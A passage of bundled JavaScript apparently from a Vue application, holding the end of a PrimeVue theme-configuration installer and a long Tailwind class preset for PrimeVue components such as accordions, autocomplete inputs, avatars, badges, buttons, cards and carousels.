    r.value || xe.setTheme(l), t.config.unstyled || o(), r.value = !1, Tr.emit("config:theme:change", {
      newValue: l,
      oldValue: u
    });
  }, {
    immediate: !0,
    deep: !0
  }), a = Ye(function() {
    return t.config.unstyled;
  }, function(l, u) {
    !l && t.config.theme && o(), Tr.emit("config:unstyled:change", {
      newValue: l,
      oldValue: u
    });
  }, {
    immediate: !0,
    deep: !0
  });
  Mt.push(s), Mt.push(n), Mt.push(i), Mt.push(a);
}
var Yc = {
  install: function(t, r) {
    var o = dc(Wc, r);
    Uc(t, o);
  }
};
const Xc = {
  // For PrimeVue version 3
  accordiontab: {
    root: {
      class: ["mb-0", "border-b border-surface-200 dark:border-surface-700"]
    },
    header: ({ props: e }) => ({
      class: [
        // State
        {
          "select-none pointer-events-none cursor-default opacity-60": e == null ? void 0 : e.disabled
        }
      ]
    }),
    headerAction: {
      class: [
        //Font
        "font-semibold",
        "leading-none",
        // Alignments
        "flex justify-between items-center",
        "flex-row-reverse",
        "relative",
        // Sizing
        "p-[1.125rem]",
        // Shape
        "rounded-md",
        "border-0",
        // Color
        "bg-surface-0 dark:bg-surface-900",
        "text-surface-600 dark:text-surface-0/80",
        // Transition
        "transition duration-200 ease-in-out",
        "transition-shadow duration-200",
        // States
        "focus:outline-none focus:outline-offset-0 focus-visible:ring-1 focus-visible:ring-primary-400 dark:focus-visible:ring-primary-300",
        // Focus
        // Misc
        "cursor-pointer no-underline select-none"
      ]
    },
    headerIcon: ({ context: e }) => ({
      class: [
        "inline-block ml-2",
        { "text-surface-900 dark:text-surface-0": e.active }
      ]
    }),
    headerTitle: {
      class: "leading-none"
    },
    content: {
      class: [
        // Spacing
        "p-[1.125rem] pt-0",
        //Shape
        "border-0 rounded-none",
        // Color
        "bg-surface-0 dark:bg-surface-900",
        "text-surface-600 dark:text-surface-0/70"
      ]
    },
    transition: {
      enterFromClass: "max-h-0",
      enterActiveClass: "overflow-hidden transition-[max-height] duration-1000 ease-[cubic-bezier(0.42,0,0.58,1)]",
      enterToClass: "max-h-[1000px]",
      leaveFromClass: "max-h-[1000px]",
      leaveActiveClass: "overflow-hidden transition-[max-height] duration-[450ms] ease-[cubic-bezier(0,1,0,1)]",
      leaveToClass: "max-h-0"
    }
  }
}, Qc = {
  content: "p-5 pt-0 bg-surface-0 dark:bg-surface-900 text-surface-600 dark:text-surface-0/70"
}, Zc = {
  root: ({ context: e }) => ({
    class: [
      "flex items-center justify-between bg-surface-0 dark:bg-surface-900 text-surface-600 dark:text-surface-0/70 p-[1.125rem] font-semibold outline-transparent",
      {
        "focus-visible:outline-offset-2 focus-visible:ring-1 focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400": !e.disabled
      },
      {
        "hover:text-surface-700 dark:hover:text-surface-0": !e.disabled
      }
    ]
  }),
  toggleIcon: "inline-block text-surface-900 dark:text-surface-0 w-4 h-4"
}, eu = {
  root: ({ props: e, context: t }) => ({
    class: [
      "flex flex-col border-b border-surface-200 dark:border-surface-700",
      {
        "[&>[data-pc-name=accordionheader]]:select-none [&>[data-pc-name=accordionheader]]:pointer-events-none [&>[data-pc-name=accordionheader]]:cursor-default [&>[data-pc-name=accordionheader]]:opacity-60": e == null ? void 0 : e.disabled,
        "[&>[data-pc-name=accordionheader]]:text-surface-700 dark:[&>[data-pc-name=accordionheader]]:text-surface-100 hover:[&>[data-pc-name=accordionheader]]:text-surface-800 dark:hover:[&>[data-pc-name=accordionheader]]:text-surface-0": !e.disabled && t.active,
        "[&>[data-pc-section=toggleicon]]:text-surface-700 dark:[&>[data-pc-section=toggleicon]]:text-surface-100 hover:[&>[data-pc-section=toggleicon]]:text-surface-800 dark:hover:[&>[data-pc-section=toggleicon]]:text-surface-0": !e.disabled && t.active,
        "[&:last-child>[data-pc-name=accordioncontent]>[data-pc-section=content]]:rounded-b-md": !e.disabled && t.active,
        "[&:last-child>[data-pc-name=accordionheader]]:rounded-b-md": !e.disabled && !t.active
      },
      "[&:nth-child(n+2)>[data-pc-name=accordionheader]]:border-t-0",
      "[&:first-child>[data-pc-name=accordionheader]]:rounded-t-md"
    ]
  })
}, tu = {
  root: ({ props: e }) => ({
    class: [
      "relative",
      // Flex
      {
        flex: e.fluid,
        "inline-flex": !e.fluid
      },
      // Size
      { "w-full": e.multiple },
      { "[&>input]:!rounded-r-none": e.dropdown },
      // Color
      "text-surface-900 dark:text-surface-0",
      //States
      {
        "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  inputMultiple: ({ props: e, state: t }) => ({
    class: [
      // Font
      "leading-none",
      // Flex
      "flex items-center flex-wrap",
      "gap-2",
      // Spacing
      "m-0 list-none",
      "py-1 px-1",
      // Size
      "w-full",
      // Shape
      "appearance-none rounded-md",
      // Color
      "text-surface-700 dark:text-white/80",
      "placeholder:text-surface-400 dark:placeholder:text-surface-500",
      { "bg-surface-0 dark:bg-surface-950": !e.disabled },
      "border",
      { "border-surface-300 dark:border-surface-700": !e.invalid },
      // Invalid State
      "invalid:focus:ring-red-200",
      "invalid:hover:border-red-500",
      { "border-red-500 dark:border-red-400": e.invalid },
      // States
      {
        "hover:border-surface-400 dark:hover:border-surface-700": !e.invalid
      },
      {
        "outline-none outline-offset-0 z-10 ring-1 ring-primary-500 dark:ring-primary-400": t.focused
      },
      // Transition
      "transition duration-200 ease-in-out",
      // Misc
      "cursor-text overflow-hidden"
    ]
  }),
  inputToken: {
    class: ["py-1 px-0 ml-2", "inline-flex flex-auto"]
  },
  inputChip: {
    class: "flex-auto inline-flex pt-1 pb-1"
  },
  input: {
    class: "border-none outline-none bg-transparent m-0 p-0 shadow-none rounded-none w-full"
  },
  dropdown: {
    class: [
      "relative",
      // Alignments
      "items-center inline-flex justify-center text-center align-bottom",
      // Shape
      "rounded-r-md",
      // Size
      "py-2 leading-none",
      "w-10",
      // Colors
      "text-primary-contrast",
      "bg-primary",
      "border border-primary",
      // States
      "focus:outline-none focus:outline-offset-0 focus:ring-1 ",
      "hover:bg-primary-emphasis hover:border-primary-emphasis",
      "focus:ring-primary-500 dark:focus:ring-primary-400"
    ]
  },
  loader: {
    class: [
      "text-surface-500 dark:text-surface-0/70",
      "absolute top-[50%] right-[0.5rem] -mt-2 animate-spin"
    ]
  },
  overlay: {
    class: [
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-white/80",
      // Shape
      "border border-surface-300 dark:border-surface-700",
      "rounded-md",
      "shadow-md",
      // Size
      "overflow-auto"
    ]
  },
  list: {
    class: "p-1 list-none m-0"
  },
  option: ({ context: e }) => ({
    class: [
      "relative",
      // Font
      "leading-none",
      // Spacing
      "m-0 px-3 py-2",
      "first:mt-0 mt-[2px]",
      // Shape
      "border-0 rounded",
      // Colors
      {
        "bg-surface-200 dark:bg-surface-600/60": e.focused && !e.selected,
        "text-surface-700 dark:text-white/80": e.focused && !e.selected,
        "bg-highlight": e.selected
      },
      //States
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.focused && !e.selected
      },
      { "hover:bg-highlight-emphasis": e.selected },
      {
        "hover:text-surface-700 hover:bg-surface-100 dark:hover:text-white dark:hover:bg-[rgba(255,255,255,0.03)]": e.focused && !e.selected
      },
      // Transition
      "transition-shadow duration-200",
      // Misc
      "cursor-pointer overflow-hidden whitespace-nowrap"
    ]
  }),
  optionGroup: {
    class: [
      "font-semibold",
      // Spacing
      "m-0 py-2 px-3",
      // Colors
      "text-surface-400 dark:text-surface-500",
      // Misc
      "cursor-auto"
    ]
  },
  emptyMessage: {
    class: [
      // Font
      "leading-none",
      // Spacing
      "py-2 px-3",
      // Color
      "text-surface-800 dark:text-white/80",
      "bg-transparent"
    ]
  },
  transition: {
    enterFromClass: "opacity-0 scale-y-[0.8]",
    enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
    leaveActiveClass: "transition-opacity duration-100 ease-linear",
    leaveToClass: "opacity-0"
  }
}, ru = {
  root: ({ props: e, parent: t }) => {
    var r, o, s;
    return {
      class: [
        // Font
        {
          "text-xl": e.size == "large",
          "text-2xl": e.size == "xlarge"
        },
        // Alignments
        "inline-flex items-center justify-center",
        "relative",
        // Sizes
        {
          "h-8 w-8": e.size == null || e.size == "normal",
          "w-12 h-12": e.size == "large",
          "w-16 h-16": e.size == "xlarge"
        },
        { "-ml-4": ((r = t.instance.$style) == null ? void 0 : r.name) == "avatargroup" },
        // Shapes
        {
          "rounded-lg": e.shape == "square",
          "rounded-full": e.shape == "circle"
        },
        { "border-2": ((o = t.instance.$style) == null ? void 0 : o.name) == "avatargroup" },
        // Colors
        "bg-surface-300 dark:bg-surface-700",
        {
          "border-white dark:border-surface-800": ((s = t.instance.$style) == null ? void 0 : s.name) == "avatargroup"
        }
      ]
    };
  },
  image: ({ props: e }) => ({
    class: [
      "h-full w-full",
      {
        "rounded-lg": e.shape == "square",
        "rounded-full": e.shape == "circle"
      }
    ]
  })
}, ou = {
  root: {
    class: "flex items-center"
  }
}, su = {
  root: ({ props: e }) => {
    var t, r;
    return {
      class: [
        // Font
        "font-bold",
        {
          "text-xs leading-[1.5rem]": e.size === null,
          "text-[0.625rem] leading-[1.25rem]": e.size === "small",
          "text-lg leading-[2.25rem]": e.size === "large",
          "text-2xl leading-[3rem]": e.size === "xlarge"
        },
        // Alignment
        "text-center inline-block",
        // Size
        "p-0 px-1",
        {
          "w-2 h-2": e.value === null,
          "min-w-[1.5rem] h-[1.5rem]": e.value !== null && e.size === null,
          "min-w-[1.25rem] h-[1.25rem]": e.size === "small",
          "min-w-[2.25rem] h-[2.25rem]": e.size === "large",
          "min-w-[3rem] h-[3rem]": e.size === "xlarge"
        },
        // Shape
        {
          "rounded-full": ((t = e.value) == null ? void 0 : t.length) === 1,
          "rounded-[0.71rem]": ((r = e.value) == null ? void 0 : r.length) !== 1
        },
        // Color
        "text-primary-contrast",
        {
          "bg-primary": e.severity == null || e.severity === "primary",
          "bg-surface-500 dark:bg-surface-400": e.severity === "secondary",
          "bg-green-500 dark:bg-green-400": e.severity === "success",
          "bg-blue-500 dark:bg-blue-400": e.severity === "info",
          "bg-orange-500 dark:bg-orange-400": e.severity === "warn",
          "bg-purple-500 dark:bg-purple-400": e.severity === "help",
          "bg-red-500 dark:bg-red-400": e.severity === "danger",
          "text-surface-0 dark:text-surface-900 bg-surface-900 dark:bg-surface-0": e.severity === "contrast"
        }
      ]
    };
  }
}, nu = {
  root: ({ context: e }) => ({
    class: [
      // Font
      "font-bold",
      "text-xs leading-5",
      // Alignment
      "flex items-center justify-center",
      "text-center",
      // Position
      "absolute top-0 right-0 transform translate-x-1/2 -translate-y-1/2 origin-top-right",
      // Size
      "m-0",
      {
        "p-0": e.nogutter || e.dot,
        "px-2": !e.nogutter && !e.dot,
        "min-w-[0.5rem] w-2 h-2": e.dot,
        "min-w-[1.5rem] h-6": !e.dot
      },
      // Shape
      {
        "rounded-full": e.nogutter || e.dot,
        "rounded-[10px]": !e.nogutter && !e.dot
      },
      // Color
      "text-primary-contrast",
      {
        "bg-primary": !e.info && !e.success && !e.warning && !e.danger && !e.help && !e.secondary,
        "bg-surface-500 dark:bg-surface-400": e.secondary,
        "bg-green-500 dark:bg-green-400": e.success,
        "bg-blue-500 dark:bg-blue-400": e.info,
        "bg-orange-500 dark:bg-orange-400": e.warning,
        "bg-purple-500 dark:bg-purple-400": e.help,
        "bg-red-500 dark:bg-red-400": e.danger
      }
    ]
  })
}, au = {
  root: "relative",
  mask: "bg-black/40 rounded-md"
}, iu = {
  root: {
    class: [
      // Shape
      "rounded-md",
      // Spacing
      "p-4",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      // Misc
      "overflow-x-auto"
    ]
  },
  list: {
    class: [
      // Flex & Alignment
      "flex items-center flex-nowrap",
      // Spacing
      "m-0 p-0 list-none leading-none"
    ]
  },
  itemLink: {
    class: [
      // Flex & Alignment
      "flex items-center gap-2",
      // Shape
      "rounded-md",
      // Color
      "text-surface-600 dark:text-white/70",
      // States
      "focus-visible:outline-none focus-visible:outline-offset-0",
      "focus-visible:ring-1 focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400",
      // Transitions
      "transition-shadow duration-200",
      // Misc
      "text-decoration-none"
    ]
  },
  itemIcon: {
    class: "text-surface-600 dark:text-white/70"
  },
  separator: {
    class: [
      // Flex & Alignment
      "flex items-center",
      // Spacing
      "mx-2",
      // Color
      "text-surface-600 dark:text-white/70"
    ]
  }
}, lu = {
  root: ({ props: e, context: t, parent: r, instance: o }) => ({
    class: [
      "relative",
      // Fluid
      { "w-full": e.fluid },
      // Alignments
      "items-center inline-flex text-center align-bottom justify-center",
      {
        "flex-col": (e.iconPos === "top" || e.iconPos === "bottom") && e.label
      },
      // Sizes & Spacing
      "leading-[normal] text-nowrap",
      {
        "px-3 py-2": e.size === null,
        "text-sm py-1.5 px-3": e.size === "small",
        "text-xl py-3 px-4": e.size === "large"
      },
      { "gap-2": e.label !== null },
      {
        "w-10 px-0": e.label == null && e.icon !== null
      },
      {
        "w-10 px-0 gap-0": o.hasIcon && !e.label && !e.badge,
        "rounded-[50%] h-10 [&>[data-pc-section=label]]:w-0 [&>[data-pc-section=label]]:invisible": o.hasIcon && !e.label && !e.badge && e.rounded
      },
      // Shapes
      { "shadow-lg": e.raised },
      { "rounded-md": !e.rounded, "rounded-full": e.rounded },
      {
        "rounded-none first:rounded-l-md last:rounded-r-md": r.instance.$name == "InputGroup"
      },
      // Link Button
      { "text-primary-600 bg-transparent border-transparent": e.link },
      // Plain Button
      {
        "text-white bg-gray-500 border border-gray-500": e.plain && !e.outlined && !e.text
      },
      // Plain Text Button
      { "text-surface-500": e.plain && e.text },
      // Plain Outlined Button
      {
        "text-surface-500 border border-gray-500": e.plain && e.outlined
      },
      // Text Button
      { "bg-transparent border-transparent": e.text && !e.plain },
      // Outlined Button
      { "bg-transparent border": e.outlined && !e.plain },
      // --- Severity Buttons ---
      // Primary Button
      {
        "text-surface-0": !e.link && e.severity === null && !e.text && !e.outlined && !e.plain,
        "bg-primary-700": !e.link && e.severity === null && !e.text && !e.outlined && !e.plain,
        "border border-primary-700": !e.link && e.severity === null && !e.text && !e.outlined && !e.plain
      },
      // Primary Text Button
      {
        "text-primary-600": e.text && e.severity === null && !e.plain
      },
      // Primary Outlined Button
      {
        "text-primary-700 border border-primary-700": e.outlined && e.severity === null && !e.plain
      },
      // Secondary Button
      {
        "text-surface-900 dark:text-white": e.severity === "secondary" && !e.text && !e.outlined && !e.plain,
        "bg-secondary-400 dark:bg-secondary-400": e.severity === "secondary" && !e.text && !e.outlined && !e.plain,
        "border border-secondary-400 dark:border-secondary-400": e.severity === "secondary" && !e.text && !e.outlined && !e.plain
      },
      // Secondary Text Button
      {
        "text-secondary-400 dark:text-secondary-400": e.text && e.severity === "secondary" && !e.plain
      },
      // Secondary Outlined Button
      {
        "text-secondary-400 dark:text-secondary-400 border border-secondary-400 hover:bg-secondary-300/10": e.outlined && e.severity === "secondary" && !e.plain
      },
      // Success Button
      {
        "text-white dark:text-success-900": e.severity === "success" && !e.text && !e.outlined && !e.plain,
        "bg-success-500 dark:bg-success-400": e.severity === "success" && !e.text && !e.outlined && !e.plain,
        "border border-success-500 dark:border-success-400": e.severity === "success" && !e.text && !e.outlined && !e.plain
      },
      // Success Text Button
      {
        "text-success-500 dark:text-success-400": e.text && e.severity === "success" && !e.plain
      },
      // Success Outlined Button
      {
        "text-success-500 border border-success-500 hover:bg-success-300/10": e.outlined && e.severity === "success" && !e.plain
      },
      // Info Button
      {
        "text-white dark:text-surface-900": e.severity === "info" && !e.text && !e.outlined && !e.plain,
        "bg-blue-500 dark:bg-info-400": e.severity === "info" && !e.text && !e.outlined && !e.plain,
        "border border-blue-500 dark:border-info-400": e.severity === "info" && !e.text && !e.outlined && !e.plain
      },
      // Info Text Button
      {
        "text-info-400 dark:text-info-400": e.text && e.severity === "info" && !e.plain
      },
      // Info Outlined Button
      {
        "text-info-400 border border-info-400 hover:bg-info-300/10 ": e.outlined && e.severity === "info" && !e.plain
      },
      // Warning Button
      {
        "text-white dark:text-surface-900": e.severity === "warn" && !e.text && !e.outlined && !e.plain,
        "bg-orange-500 dark:bg-orange-400": e.severity === "warn" && !e.text && !e.outlined && !e.plain,
        "border border-orange-500 dark:border-orange-400": e.severity === "warn" && !e.text && !e.outlined && !e.plain
      },
      // Warning Text Button
      {
        "text-orange-500 dark:text-orange-400": e.text && e.severity === "warn" && !e.plain
      },
      // Warning Outlined Button
      {
        "text-orange-500 border border-orange-500 hover:bg-orange-300/10": e.outlined && e.severity === "warn" && !e.plain
      },
      // Help Button
      {
        "text-white dark:text-surface-900": e.severity === "help" && !e.text && !e.outlined && !e.plain,
        "bg-purple-500 dark:bg-purple-400": e.severity === "help" && !e.text && !e.outlined && !e.plain,
        "border border-purple-500 dark:border-purple-400": e.severity === "help" && !e.text && !e.outlined && !e.plain
      },
      // Help Text Button
      {
        "text-purple-500 dark:text-purple-400": e.text && e.severity === "help" && !e.plain
      },
      // Help Outlined Button
      {
        "text-purple-500 border border-purple-500 hover:bg-purple-300/10": e.outlined && e.severity === "help" && !e.plain
      },
      // Danger Button
      {
        "text-white dark:text-surface-900": e.severity === "danger" && !e.text && !e.outlined && !e.plain,
        "bg-danger-500 dark:bg-danger-400": e.severity === "danger" && !e.text && !e.outlined && !e.plain,
        "border border-danger-500 dark:border-danger-400": e.severity === "danger" && !e.text && !e.outlined && !e.plain
      },
      // Danger Text Button
      {
        "text-danger-400 dark:text-danger-400": e.text && e.severity === "danger" && !e.plain
      },
      // Danger Outlined Button
      {
        "text-danger-400 border border-danger-400 hover:bg-danger-300/10": e.outlined && e.severity === "danger" && !e.plain
      },
      // Contrast Button
      {
        "text-white dark:text-surface-900": e.severity === "contrast" && !e.text && !e.outlined && !e.plain,
        "bg-surface-900 dark:bg-surface-300": e.severity === "contrast" && !e.text && !e.outlined && !e.plain,
        "border border-surface-900 dark:border-surface-300": e.severity === "contrast" && !e.text && !e.outlined && !e.plain
      },
      // Contrast Text Button
      {
        "text-surface-900 dark:text-surface-300": e.text && e.severity === "contrast" && !e.plain
      },
      // Contrast Outlined Button
      {
        "text-surface-900 dark:text-surface-300 border border-surface-900 dark:border-surface-600": e.outlined && e.severity === "contrast" && !e.plain
      },
      // --- Severity Button States ---
      "focus:outline-none focus:outline-offset-0 focus:ring-1",
      // Link
      { "focus:ring-primary-400": e.link },
      // Plain
      {
        "hover:bg-gray-600 hover:border-gray-600": e.plain && !e.outlined && !e.text
      },
      // Text & Outlined Button
      {
        "hover:bg-surface-300/10": e.plain && (e.text || e.outlined)
      },
      // Primary
      {
        "hover:bg-primary-600/80 hover:border-primary-600/80": !e.link && e.severity === null && !e.text && !e.outlined && !e.plain
      },
      { "focus:ring-primary-300": e.severity === null },
      // Text & Outlined Button
      {
        "hover:bg-primary-300/10": (e.text || e.outlined) && e.severity === null && !e.plain
      },
      // Secondary
      {
        "hover:bg-secondary-300 dark:hover:bg-secondary-300 hover:border-secondary-300 dark:hover:border-secondary-300": e.severity === "secondary" && !e.text && !e.outlined && !e.plain
      },
      {
        "focus:ring-secondary-500 dark:focus:ring-secondary-400": e.severity === "secondary"
      },
      // Text & Outlined Button
      {
        "hover:bg-secondary-300/10": (e.text || e.outlined) && e.severity === "secondary" && !e.plain
      },
      // Success
      {
        "hover:bg-success-600 dark:hover:bg-success-300 hover:border-success-600 dark:hover:border-success-300": e.severity === "success" && !e.text && !e.outlined && !e.plain
      },
      {
        "focus:ring-success-500 dark:focus:ring-success-400": e.severity === "success"
      },
      // Text & Outlined Button
      {
        "hover:bg-success-300/10": (e.text || e.outlined) && e.severity === "success" && !e.plain
      },
      // Info
      {
        "hover:bg-blue-600 dark:hover:bg-info-300 hover:border-blue-600 dark:hover:border-info-300": e.severity === "info" && !e.text && !e.outlined && !e.plain
      },
      {
        "focus:ring-blue-400 dark:focus:ring-info-300": e.severity === "info"
      },
      // Text & Outlined Button
      {
        "hover:bg-info-300/10": (e.text || e.outlined) && e.severity === "info" && !e.plain
      },
      // Warning
      {
        "hover:bg-orange-600 dark:hover:bg-orange-300 hover:border-orange-600 dark:hover:border-orange-300": e.severity === "warn" && !e.text && !e.outlined && !e.plain
      },
      {
        "focus:ring-orange-500 dark:focus:ring-orange-400": e.severity === "warn"
      },
      // Text & Outlined Button
      {
        "hover:bg-orange-300/10": (e.text || e.outlined) && e.severity === "warn" && !e.plain
      },
      // Help
      {
        "hover:bg-purple-600 dark:hover:bg-purple-300 hover:border-purple-600 dark:hover:border-purple-300": e.severity === "help" && !e.text && !e.outlined && !e.plain
      },
      {
        "focus:ring-purple-500 dark:focus:ring-purple-400": e.severity === "help"
      },
      // Text & Outlined Button
      {
        "hover:bg-purple-300/10": (e.text || e.outlined) && e.severity === "help" && !e.plain
      },
      // Danger
      {
        "hover:bg-danger-600 dark:hover:bg-danger-300 hover:border-danger-600 dark:hover:border-danger-300": e.severity === "danger" && !e.text && !e.outlined && !e.plain
      },
      {
        "focus:ring-danger-500 dark:focus:ring-danger-400": e.severity === "danger"
      },
      // Text & Outlined Button
      {
        "hover:bg-danger-300/10": (e.text || e.outlined) && e.severity === "danger" && !e.plain
      },
      // Contrast
      {
        "hover:bg-surface-800 dark:hover:bg-surface-200 hover:border-surface-800 dark:hover:border-surface-200": e.severity === "contrast" && !e.text && !e.outlined && !e.plain
      },
      {
        "focus:ring-surface-500 dark:focus:ring-surface-0": e.severity === "contrast"
      },
      // Text & Outlined Button
      {
        "hover:bg-surface-900/10 dark:hover:bg-[rgba(255,255,255,0.03)]": (e.text || e.outlined) && e.severity === "contrast" && !e.plain
      },
      // Disabled
      { "opacity-60 pointer-events-none cursor-default": t.disabled },
      // Transitions
      "transition duration-200 ease-in-out",
      // Misc
      "cursor-pointer overflow-hidden select-none",
      // Badge
      "[&>[data-pc-name=badge]]:min-w-4 [&>[data-pc-name=badge]]:h-4 [&>[data-pc-name=badge]]:leading-4"
    ]
  }),
  label: ({ props: e }) => ({
    class: [
      "duration-200",
      "font-medium",
      "truncate",
      {
        "hover:underline": e.link
      },
      { "flex-1": e.label !== null, "invisible w-0": e.label == null }
    ]
  }),
  icon: ({ props: e }) => ({
    class: [
      "text-base leading-4",
      "mx-0",
      {
        "mr-2": e.iconPos == "left" && e.label != null,
        "ml-2 order-1": e.iconPos == "right" && e.label != null,
        "order-2": e.iconPos == "bottom" && e.label != null
      }
    ]
  }),
  loadingIcon: ({ props: e }) => ({
    class: [
      "h-4 w-4",
      "mx-0",
      {
        "mr-2": e.iconPos == "left" && e.label != null,
        "ml-2 order-1": e.iconPos == "right" && e.label != null,
        "mb-2": e.iconPos == "top" && e.label != null,
        "mt-2": e.iconPos == "bottom" && e.label != null
      },
      "animate-spin"
    ]
  }),
  badge: ({ props: e }) => ({
    class: [
      {
        "ml-2 w-4 h-4 leading-none flex items-center justify-center": e.badge
      }
    ]
  })
}, cu = {
  root: {
    class: [
      "[&>[data-pc-name=button]]:m-0",
      "[&>[data-pc-name=button]]:border-r-none",
      "[&>[data-pc-name=button]:nth-last-child(n+2)]:rounded-tr-none",
      "[&>[data-pc-name=button]:nth-last-child(n+2)]:rounded-br-none",
      "[&>[data-pc-name=button]:nth-child(n+2)]:rounded-tl-none",
      "[&>[data-pc-name=button]:nth-child(n+2)]:rounded-bl-none",
      "flex"
    ]
  }
}, uu = {
  root: {
    class: [
      //Flex
      "flex flex-col",
      //Shape
      "rounded-[0.25rem]",
      "shadow-md",
      //Color
      "bg-surface-0 dark:bg-surface-800",
      "text-surface-700 dark:text-surface-0"
    ]
  },
  body: {
    class: [
      //Flex
      "flex flex-col",
      "gap-4",
      "p-6"
    ]
  },
  caption: {
    class: [
      //Flex
      "flex flex-col",
      "gap-2"
    ]
  },
  title: {
    class: "text-xl font-semibold mb-0"
  },
  subtitle: {
    class: [
      //Font
      "font-normal",
      //Spacing
      "mb-0",
      //Color
      "text-surface-600 dark:text-surface-0/60"
    ]
  },
  content: {
    class: "p-0"
  },
  footer: {
    class: "p-0"
  }
}, du = {
  root: {
    class: [
      // Flexbox
      "flex flex-col"
    ]
  },
  contentContainer: {
    class: [
      // Flexbox & Overflow
      "flex flex-col overflow-auto"
    ]
  },
  content: ({ props: e }) => ({
    class: [
      // Flexbox
      "flex",
      // Orientation
      {
        "flex-row": e.orientation !== "vertical",
        "flex-col": e.orientation == "vertical"
      },
      "[&>[data-pc-extend=button]]:self-center"
    ]
  }),
  viewport: {
    class: [
      // Overflow & Width
      "overflow-hidden w-full"
    ]
  },
  itemList: ({ props: e }) => ({
    class: [
      // Flexbox
      "flex",
      // Orientation & Sizing
      {
        "flex-row": e.orientation !== "vertical",
        "flex-col h-full": e.orientation == "vertical"
      }
    ]
  }),
  item: ({ props: e }) => ({
    class: [
      // Flexbox
      "flex shrink-0 grow ",
      // Size
      {
        "w-full sm:w-[50%] md:w-[33.333333333333336%]": e.orientation !== "vertical",
        "w-full h-full": e.orientation == "vertical"
      }
    ]
  }),
  itemClone: ({ props: e }) => ({
    class: [
      // Flexbox
      "flex shrink-0 grow",
      "unvisible",
      // Size
      {
        "w-full sm:w-[50%] md:w-[33.333333333333336%]": e.orientation !== "vertical",
        "w-full h-full": e.orientation == "vertical"
      }
    ]
  }),
  indicatorList: {
    class: [
      // Flexbox & Alignment
      "flex flex-row justify-center flex-wrap"
    ]
  },
  indicator: {
    class: [
      // Spacing
      "mr-2 mb-2"
    ]
  },
  indicatorButton: ({ context: e }) => ({
    class: [
      // Sizing & Shape
      "w-8 h-2 rounded-md",
      // Transitions
      "transition duration-200",
      // Focus Styles
      "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400",
      // Color & Background
      {
        "bg-surface-200 hover:bg-surface-300 dark:bg-surface-700 dark:hover:bg-surface-600": !e.highlighted,
        "bg-primary hover:bg-primary-emphasis": e.highlighted
      }
    ]
  })
}, fu = {
  root: ({ props: e, state: t }) => ({
    class: [
      "relative",
      // Flex
      {
        flex: e.fluid,
        "inline-flex": !e.fluid
      },
      // Shape
      "rounded-md",
      // Color and Background
      { "bg-surface-0 dark:bg-surface-950": !e.disabled },
      "border",
      { "border-surface-300 dark:border-surface-600": !e.invalid },
      // Invalid State
      "invalid:focus:ring-red-200",
      "invalid:hover:border-red-500",
      { "border-red-500 dark:border-red-400": e.invalid },
      // Transitions
      "transition-all",
      "duration-200",
      // States
      {
        "hover:border-surface-400 dark:hover:border-surface-600": !e.invalid
      },
      {
        "outline-none outline-offset-0 ring-1 ring-primary-500 dark:ring-primary-400": t.focused
      },
      // Misc
      "cursor-pointer",
      "select-none",
      {
        "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  label: ({ props: e, parent: t }) => {
    var r, o, s, n;
    return {
      class: [
        //Font
        "leading-[normal]",
        // Display
        "block",
        "flex-auto",
        // Color and Background
        "bg-transparent",
        "border-0",
        {
          "text-surface-800 dark:text-white/80": e.modelValue != null,
          "text-surface-400 dark:text-surface-500": e.modelValue == null
        },
        {
          "placeholder:text-transparent dark:placeholder:text-transparent": ((r = t.instance) == null ? void 0 : r.$name) == "FloatLabel",
          "!text-transparent dark:!text-transparent": ((o = t.instance) == null ? void 0 : o.$name) == "FloatLabel" && e.modelValue == null || ((s = e.modelValue) == null ? void 0 : s.length) == 0
        },
        // Sizing and Spacing
        "w-[1%]",
        "py-2 px-3",
        { "pr-7": e.showClear },
        //Shape
        "rounded-none",
        // Transitions
        "transition",
        "duration-200",
        // States
        "focus:outline-none focus:shadow-none",
        // Filled State *for FloatLabel
        {
          filled: ((n = t.instance) == null ? void 0 : n.$name) == "FloatLabel" && e.modelValue !== null
        },
        // Misc
        "relative",
        "cursor-pointer",
        "overflow-hidden overflow-ellipsis",
        "whitespace-nowrap",
        "appearance-none"
      ]
    };
  },
  dropdown: {
    class: [
      // Flexbox
      "flex items-center justify-center",
      "shrink-0",
      // Color and Background
      "bg-transparent",
      "text-surface-500",
      // Size
      "w-12",
      // Shape
      "rounded-r-md"
    ]
  },
  overlay: {
    class: [
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-white/80",
      // Shape
      "border border-surface-300 dark:border-surface-700",
      "rounded-md",
      "shadow-md"
    ]
  },
  list: {
    class: "flex flex-col list-none p-0 m-0 gap-[2px] min-w-full"
  },
  option: ({ context: e }) => ({
    class: [
      //Shape
      "rounded-[4px]",
      // Spacing
      "first:mt-0 mt-[2px]",
      // Colors
      {
        "text-surface-500 dark:text-white/70": !e.focused && !e.active,
        "text-surface-500 dark:text-white/70 bg-surface-200 dark:bg-surface-600/90": e.focused && !e.active,
        "bg-highlight text-highlight-contrast": e.focused && e.active || e.active || !e.focused && e.active
      },
      // Transitions
      "transition-shadow",
      "duration-200",
      // States
      {
        "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.active,
        "hover:bg-highlight-emphasis": e.active
      },
      // Disabled
      { "opacity-60 pointer-events-none cursor-default": e.disabled }
    ]
  }),
  optionContent: {
    class: [
      "relative",
      "leading-[normal]",
      // Flexbox
      "flex",
      "items-center",
      // Spacing
      "py-2",
      "px-3",
      // Misc
      "no-underline",
      "overflow-hidden",
      "cursor-pointer",
      "select-none"
    ]
  },
  groupIcon: {
    class: [
      // Alignment
      "ml-auto"
    ]
  },
  optionList: {
    class: [
      "min-w-full",
      // Spacing
      "p-1",
      "m-0",
      "list-none",
      // Shape
      "shadow-none sm:shadow-md",
      "rounded-md",
      "border border-surface-200 dark:border-surface-700",
      // Position
      "static sm:absolute",
      "z-10",
      // Color
